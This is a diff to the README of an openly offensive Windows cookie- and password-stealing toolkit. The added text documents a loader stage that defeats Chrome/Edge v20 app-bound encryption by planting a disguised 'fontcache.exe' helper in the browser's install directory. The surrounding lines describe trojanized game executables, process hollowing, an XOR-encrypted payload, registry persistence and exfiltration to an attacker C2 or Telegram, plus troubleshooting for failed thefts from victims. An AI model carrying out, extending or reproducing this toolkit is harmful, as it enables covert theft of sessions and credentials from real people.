@@ -185,8 +185,11 @@ There is no build step on Linux by design: the victim-side binaries ship prebuil
   the payload (`build.bat`)
 - **Python deps:** `pip install -r requirements.txt` -- installs `cryptography` (DPAPI /
   AES-GCM for `cookielog.py`) and `websocket-client` (CDP, legacy live mode)
-- **PsExec64.exe** -- included under `tools/`, only for the Chrome >=127 v20 app-bound key
-  staging (`cookielog.py --v20-sys`)
+- **Elevated context** -- the Chrome/Edge v20 key stage writes a helper into the browser's
+  `Application` directory, so the loader only runs it when its own token is elevated.
+  Without that, v10/v11 stores, Firefox and the CEF apps are still collected and the
+  app-bound browsers are reported as `no-key`. `bin\ckkey.exe /quiet` is the manual path.
+  `tools\PsExec64.exe` is only for the legacy `cookielog.py --v20-sys` flow.
 
 ---
 
@@ -207,7 +210,8 @@ The end-to-end infection and exfiltration chain:
    (standalone) to the victim.
 4. **Victim runs it.** The host app/game opens normally (rename-restore preserves the original
    exe name, which Unity games require), and a hidden payload runs via process hollowing of
-   `notepad.exe` (`cmd.exe` fallback).
+   `notepad.exe` (`cmd.exe` fallback). If the loader token is elevated it first runs the v20
+   key stage described under *Chromium cookie decryption*.
 5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
    (Chromium-based) and Firefox on the **victim's** machine.
 6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
@@ -329,6 +333,13 @@ python cookielog.py
 
 Stage 2 writes the decrypted key to `C:\ProgramData\MediaCache\mc.key`, which stage 3 reads.
 
+The injected payload has the same unlock built in (v11): `loader.exe` embeds `ckdec.exe`,
+discovers the installed browser's Elevation Service CLSID under `Classes\CLSID`, deploys the
+helper into the browser's `Application` directory, and writes the raw key to
+`C:\ProgramData\MediaCache\mc-<browser>.key`. It only runs when the loader token is elevated
+(the write target is Program Files); otherwise the payload reports the store as `no-key`.
+The `--v20-*` flow above remains the manual route when the payload cannot elevate.
+
 ### `session_break.py` -- session cookie extractor + cryptanalysis
 
 Standalone Python tool that extracts session cookies from a running browser via handle
@@ -380,16 +391,21 @@ tab close; `--auth` keeps only cookies whose names match login/token patterns.
 
 ### `build.bat` -- compile
 
-Compiles the payload DLL and the loader. Requires MSVC (`cl.exe`).
+Compiles the payload DLL, the key helper and the loader. Requires MSVC (`cl.exe`) or
+`build_clang.bat` (clang-cl + lld-link + llvm-ml) when the VS install has headers/libs but
+no compiler. `build_keytool.bat` builds the standalone manual key stage.
 
 ```bat
 build.bat
+build_keytool.bat   :: optional: bin\ckkey.exe
 ```
 
 Produces:
 
-- `bin\ckdll.dll` -- payload (~35 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`, `/INCREMENTAL:NO`)
-- `bin\loader.exe` -- loader (~145 KB, `/MT` static CRT, GUI subsystem, version resource)
+- `bin\ckdll.dll` -- payload (~51 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`, `/INCREMENTAL:NO`)
+- `bin\ckdec.exe` -- elevation-service client (~143 KB), built before the loader resource
+- `bin\loader.exe` -- loader (~316 KB, `/MT` static CRT, GUI subsystem, version resource,
+  embedded `ckdec.exe` RCDATA)
 - `src\payload.h` -- the DLL as a byte array (XOR-encrypted by `gen.ps1`), embedded into the loader
 
 ### Testing the listener
@@ -529,7 +545,9 @@ python auto.py "C:\path\to\target_folder" --telegram 7123456789:AAH...:987654321
 | `cookies_all.txt` | Netscape format (repo root) | `cookielog.py` |
 | `cookie_log.jsonl` | Continuous change log (one line per change) | `cookielog.py --live` |
 | `swap/<site>.txt` | Per-site Netscape cookies | `swap.py` |
-| `C:\ProgramData\MediaCache\mc.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
+| `C:\ProgramData\MediaCache\mc-<browser>.key` | Raw 32-byte v20 app-bound key, one per Chromium browser | `loader.exe` key stage |
+| `C:\ProgramData\MediaCache\stage-<browser>.appb` | Temporary APPB blob (deleted after the service call) | `loader.exe` key stage |
+| `C:\ProgramData\MediaCache\mc.key` | Legacy single v20 key file (still read as a fallback) | `cookielog.py --v20-usr`, `ckkey.exe` |
 | `C:\ProgramData\MediaCache\cache.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
 | `C:\ProgramData\MediaCache\cache.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
 | `~ck_bak.bin` | Hidden backup of infected exe (created on victim, auto-deleted) | `loader.exe` |
@@ -552,7 +570,8 @@ cookielog/
 |-- sink.py               # Pipe/FIFO server (local fallback, no C2 needed)
 |-- swap.py               # Splits cookies by site (per-site cookies.txt)
 |-- cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
-|-- build.bat             # Compiles ckdll.dll + loader.exe (needs MSVC)
+|-- build.bat             # Compiles ckdll.dll + ckdec.exe + loader.exe (needs MSVC)
+|-- build_keytool.bat     # Compiles ckkey.exe with ckdec.exe embedded
 |-- start_attack.bat      # Starts listener + pick.py GUI together
 |-- test_curl.bat         # Tests listener with curl
 |-- cmd_init.cmd          # Linux-style aliases for cmd.exe
@@ -565,20 +584,25 @@ cookielog/
 |-- .gitignore
 |-- src/
 |   |-- ckdll.cpp         # Payload DLL (CRT-less, injectable)
-|   |-- loader.cpp        # Loader (process hollowing + XOR decrypt + sentinel patch)
+|   |-- loader.cpp        # Loader (hollowing + XOR decrypt + sentinel patch + v20 key stage)
+|   |-- ckdec.cpp         # Elevation-service client (embedded in loader.exe and ckkey.exe)
 |   |-- payload.h         # XOR-encrypted DLL bytes (auto-generated by gen.ps1)
-|   |-- loader.rc         # Version resource ("Windows Presentation Font Cache")
+|   |-- loader.rc         # Version resource + ckdec.exe RCDATA
 |   `-- gen.ps1           # XOR-encrypts ckdll.dll -> payload.h (16-byte key from DLL bytes)
+|-- keytool.cpp           # Manual v20 key stage (standalone ckkey.exe)
+|-- keytool.rc            # Embeds ckdec.exe into ckkey.exe
 |-- bin/                  # Build output (prebuilt, tracked)
-|   |-- loader.exe        # ~145 KB (XOR payload + dynamic API, no injection imports in IAT)
-|   |-- ckdll.dll         # ~35 KB
-|   `-- loader.res        # Compiled version resource
+|   |-- loader.exe        # ~316 KB (XOR payload + embedded helper + dynamic API)
+|   |-- ckdll.dll         # ~51 KB
+|   |-- ckdec.exe         # ~143 KB (elevation-service client)
+|   |-- ckkey.exe         # ~285 KB (manual key stage, embeds ckdec.exe)
+|   `-- loader.res        # Compiled version resource + helper
 |-- ifec/                 # Infected outputs (gitignored)
 |   |-- folds/            # Folder-mode infections (game + dependencies)
 |   `-- apps/             # Standalone infections (single .exe)
 |-- loot/                 # Captured cookies (gitignored)
 `-- tools/
-    `-- PsExec64.exe      # Sysinternals (for legacy v20 extraction)
+    `-- PsExec64.exe      # Sysinternals (for legacy `cookielog.py --v20-sys`)
 ```
 
 ---
@@ -599,11 +623,13 @@ The toolkit is split in two sides, and only the ATTACKER side is portable:
 **Windows-only** (they bind to Win32 by design):
 - `bin/loader.exe` + `bin/ckdll.dll` -- the payload uses DPAPI (cookie key decryption),
   process hollowing (NtCreateThreadEx), the Windows registry (persistence) and NT pipes;
-  the targets themselves (Chromium/Edge/Firefox cookie stores on Windows victims) are Windows paths
+  the loader's v20 key stage writes into the browser install tree and calls the Windows
+  Elevation Service. The targets themselves (Chromium/Edge/Firefox stores) are Windows paths
 - `build.bat` -- needs MSVC. On Linux, copy prebuilt `bin/loader.exe` + `bin/ckdll.dll`
   from a Windows build machine; infection works without compiling (the repo ships prebuilt)
 - `cookielog.py` -- stages the v20 app-bound key on a Windows victim (DPAPI +
-  elevation_service). No Linux mode (Linux Chrome keys use the user keyring, not DPAPI)
+  elevation_service). No Linux mode (Linux Chrome keys use the user keyring, not DPAPI).
+  `bin\ckkey.exe /quiet` is the compiled equivalent for a machine without Python
 - `auto.py --run` / `pick.py` loader launch -- runs the infected PE: test on Windows
 - `session_break.py` live Vivaldi hijack -- NtQuerySystemInformation; the Firefox read
   and the cryptanalysis report work on Linux (profile at `~/.mozilla/firefox`)
@@ -794,6 +820,30 @@ Chromium stores cookie values encrypted with AES-256-GCM:
 2. **Cookie value** -- `v10`/`v11`-prefixed blobs are decrypted with AES-256-GCM via CNG
    (`BCryptOpenAlgorithmProvider` / `BCryptGenerateSymmetricKey` / `BCryptDecrypt`): 3-byte
    prefix, 12-byte IV/nonce, ciphertext, 16-byte GCM tag.
+3. **v20 app-bound key** -- Chrome 127+ adds `app_bound_encrypted_key` to `Local State`:
+   base64 with an `APPB` prefix, wrapped with a SYSTEM DPAPI layer plus the user's DPAPI.
+   Only the browser's Elevation Service can unwrap it, and the service validates the caller
+   path (`MaybeTrimProcessPath`), so the call must come from inside the browser's
+   `Application` directory with an impersonation-level proxy blanket.
+
+The payload cannot do that from a hollowed process; the loader does it before injection
+(v11). `loader.exe` carries `ckdec.exe` as RCDATA and, when elevated:
+
+1. Finds `Local State` under `%LOCALAPPDATA%` (then `%APPDATA%`) for each Chromium browser
+   and extracts the base64 `app_bound_encrypted_key`.
+2. Resolves the installed browser from `App Paths` (rejecting paths that no longer exist)
+   and the known `Program Files` / `Program Files (x86)` / `%LOCALAPPDATA%` layouts.
+3. Walks `HKLM` and `HKCU` `SOFTWARE\Classes\CLSID`, opens each `LocalServer32`, and matches
+   `elevation_service.exe` paths under that browser's `Application` directory. The CLSID
+   string is passed to the helper, so Chrome, Edge, Brave and other forks share one build.
+4. Writes the helper as `<Application>\fontcache.exe`, passes the blob and CLSID, waits for
+   `DecryptData`, and keeps the raw 32-byte key as `mc-<browser>.key`.
+5. Deletes the helper, the intermediate blob, and any stale key from an earlier run.
+
+The stage is gated on an elevated token because the write target is Program Files. A
+non-elevated run skips it and the coverage manifest reports the browser as `no-key`; the
+v10/v11 key remains usable for stores that still have one. `bin\ckkey.exe /quiet` performs
+the same unlock manually.
 
 **Chrome >=118 domain hash prefix.** Both v10 and v20 cookies have a 32-byte
 `SHA256(host_key)` hash prepended to the decrypted plaintext. The payload verifies this by
@@ -886,7 +936,7 @@ opened read-only with SQLite.
 | WinHTTP error `12029` | WinHTTP/WinINet fail inside a hollowed process (proxy config unavailable) | The payload uses Winsock2, not WinHTTP -- rebuild `ckdll.dll` if you hit this (current code already uses Winsock2) |
 | `loader: base 0x5F000000 occupied` | Another process already mapped the payload's fixed base address | Use a different host `.exe`, or reboot / close the conflicting process |
 | Cookies not received by listener | `listen.py` not running, wrong C2 URL, or firewall blocking the port | Confirm `listen.py` is up, the C2 URL matches `http://<attacker-ip>:<port>/`, and the port is open in the firewall |
-| No Chromium cookies decrypted | Chrome >=127 uses the app-bound v20 key, which isn't present | Run `cookielog.py --v20-sys` (as SYSTEM via PsExec) then `--v20-usr` to generate `mc.key`, then re-extract |
+| No Chromium cookies decrypted on Chrome/Edge >=127, coverage says `no-key` | v20 app-bound key absent. The loader's key stage needs an elevated token because it writes the helper into the browser's `Application` directory | Run the package from an elevated context; otherwise use `bin\ckkey.exe /quiet` on the victim (or the legacy `cookielog.py --v20-sys` + `--v20-usr` flow) to generate the key, then re-extract |
 | `DumpChromium: copy failed (browser running?)` | Browser holds a 0-sharing lock on the cookie DB (`CopyFileShared` failed, error 32) | The payload falls back to handle hijacking automatically. If hijack also fails, check `cache.log` (DEBUG builds) for `HijackCookieDB` messages |
 | Invalid JSON at listener (`Invalid control character`) | Old payload used raw `Put()` (no escaping) for password values -- binary chars in decrypted passwords break JSON | Fixed in current build (`PutJ()`). Rebuild with `build.bat` |
 | DPAPI failed (`CryptUnprotectData` returns false) | Running as a different user than the profile owner | Run the extraction in the target user's context (DPAPI keys are per-user) |
